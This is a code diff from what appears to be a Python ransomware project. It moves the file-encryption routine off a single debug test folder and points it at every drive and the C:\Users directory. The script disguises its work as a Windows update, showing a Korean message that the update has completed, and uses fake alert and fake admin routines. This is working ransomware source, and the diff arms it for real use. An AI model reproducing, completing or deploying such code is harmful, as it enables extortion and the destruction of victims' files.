@@ -33,7 +33,6 @@ ThreadPool=[]
 IsAdmin=ctypes.windll.shell32.IsUserAnAdmin()
 
 PathList=[]
-PathList_DEBUG=[]
 
 def makeRSAKey():
     global PRIVATE_KEY_RSA, PUBLIC_KEY_RSA
@@ -96,15 +95,13 @@ def setEncryptModule():
     EncryptModule=nacl.secret.SecretBox(PRIVATE_KEY_AES)
 
 def listUpTargetDir():
-    global PathList, PathList_DEBUG
-    #PathList=[r"C:\Users\\"]
-    #for letter in range(97, 123):
-    #    drive=f"{chr(letter)}:\\"
-    #    if (pathlib.Path(drive).exists()):
-    #        PathList.append(drive)
-    #PathList.remove("c:\\")
-    #print(f"[DEBUG] PathList: {PathList}")
-    PathList_DEBUG=["E:\\github\\-ransomware\\최지웅\\test"]
+    global PathList
+    PathList=[r"C:\Users\\"]
+    for letter in range(97, 123):
+        drive=f"{chr(letter)}:\\"
+        if (pathlib.Path(drive).exists()):
+            PathList.append(drive)
+    PathList.remove("c:\\")
 
 def recursiveEncrypt(basepath):
     global ThreadPool
@@ -156,16 +153,17 @@ if __name__=='__main__':
 
     if(IsAdmin==True):
         task_thread = threading.Thread(target=fakeAlert)
-        for drive in PathList_DEBUG:
+        for drive in PathList:
             start=time.time()
             recursiveEncrypt(drive)
             end=time.time()
             while (len(ThreadPool)!=0):
                 th=ThreadPool.pop()
                 th.join()
+        print("Windows 업데이트가 완료되었습니다.")
+        dumpVariable()
+        os.system(afterFileName)
     else:
         fakeAdmin()
-    #dumpVariable()
-    print("Windows 업데이트가 완료되었습니다.")
-    os.system(afterFileName)
+        
     sys.exit()
